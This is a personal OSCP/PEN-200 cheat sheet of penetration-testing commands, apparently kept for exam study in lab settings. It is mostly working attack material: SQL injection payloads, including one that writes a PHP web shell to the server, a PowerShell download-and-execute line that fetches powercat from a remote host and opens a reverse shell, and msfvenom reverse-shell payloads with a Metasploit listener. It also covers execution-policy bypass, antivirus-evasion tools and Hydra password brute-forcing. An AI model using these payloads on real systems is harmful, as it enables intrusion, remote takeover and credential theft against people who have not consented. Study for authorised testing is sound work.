# OSCP-Notes
Cheatsheet/Notes from PEN-200 Learning Platform for the OSCP Exam

Things that we should look for on a system:
    - Username and hostname
    - Group memberships of the current user
    - Existing users and groups
    - Operating system, version and architecture
    - Network information
    - Installed applications
    - Running processes


Transfer File From Windows To Linux via ssh:
    1.on linux 2. on windows:
    
        1. sudo systemctl start ssh
        2. scp C:\Users\offsec\Desktop\malware.exe shaleph@192.168.45.162:/home/shaleph/OSCP 
        
file metadata analyzer:

    exiftool -a -u <file.name>
  
Web App Pentest

    Command Injection
      Check if CMD or PowerShell we have:
        (dir 2>&1 *`|echo CMD);&<# rem #>echo PowerShell
      PowerCat for Reverse shell. first copy to local dir: 
        cp /usr/share/powershell-empire/empire/server/data/module_source/management/powercat.ps1 .


  SQLi
    MySQL:
      connect to mysql remotely:
      
        mysql -u <user> -h <ip> -P 3306 -p;
        
  commands after connection:
      
        show databases;
        select version();
        show tables in mysql;
        select * from mysql.user;
        select * from mysql.user where user = 'username';
        
  MSSQL:
      connect:
      
        impacket-mssqlclient <user>:<pass>@<ip> -windows-auth
  commnads:
  
        select @@version;
        select name from sys.databases;
        select * from <db_name>.information_schema.tables;
        select * from master.dbo.sysusers;

  Injections: 
  
      offsec' OR 1=1 -- //
      if above successful:
            ' or 1=1 in (select @@version) -- //
            
  UNION injections:
      first get number of columns (increase number by 1):
      
        ' ORDER BY 1-- //
        ' UNION SELECT null, null, database(), user(), @@version  -- //
        ' union select null, table_name, column_name, table_schema, null from information_schema.columns where table_schema=database() -- //
      shell with Union
        ' UNION SELECT "<?php system($_GET['cmd']);?>", null, null, null, null INTO OUTFILE "/var/www/html/tmp/webshell.php" -- //

  Time Based Blind SQL:
      ' AND IF (1=1, sleep(3),'false') -- //

Anti-Virus Bypass Tools (AV Bypass) : 
    1.shellter (obfuscating and inserting payloads in file normal files) 
    2.vail - obfuscating payload codes themselfs
    Reccomendation: Use the meterpreter reverse shells and run msfconsole listener below. (adjust ofc)

Msfconsole Listener:

        msfconsole -x "use exploit/multi/handler;set payload windows/meterpreter/reverse_tcp;set LHOST 192.168.50.1;set LPORT 443;run;"

Payload Generator msfvenom:

    msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.50.1 LPORT=443 -f exe > binary.exe

Execution Policy on Windows:

    Get-ExecutionPolicy -Scope CurrentUser
    Set-ExecutionPolicy -ExecutionPolicy Unrestricted -Scope CurrentUser
    ExecutionPolicy -bypass
    
        
Download and execute in PowerShell:

    IEX(New-Object System.Net.Webclient).DownloadString("http://192.168.119.3/powercat.ps1");powercat -c 192.168.119.3 -p 4444 -e powershell 

Windows Privesc:
    Enum:
        Users and Groups:
        
            whoami
            whoami /groups
            Get-LocalUser (In PS)
            net user <username>
            Get-LocalGroup
            Get-LocalGroupMember <groupname>
        System:
            systeminfo
        Network:
            ipconfig /all
            route print
            netstat -ano (active TCP connections and ports)
        Installed Apps:
            Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
            Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
        Running Processes:
            Get-Process

        Search for files:
            Get-ChildItem -Path C:\ -Include *.<file.extention> -File -Recurse -ErrorAction SilentlyContinue

        Commands Executed by user:
            Get-History
            (Get-PSReadlineOption).HistorySavePath

Password Shit:
        Hydra:

            hydra -L users.txt -P /usr/share/wordlists/rockyou.txt ssh://192.168.211.202
            hydra -l user -P /usr/share/wordlists/rockyou.txt 192.168.50.201 http-post-form "/index.php:fm_usr=user&fm_pwd=^PASS^:Login failed. Invalid"
            
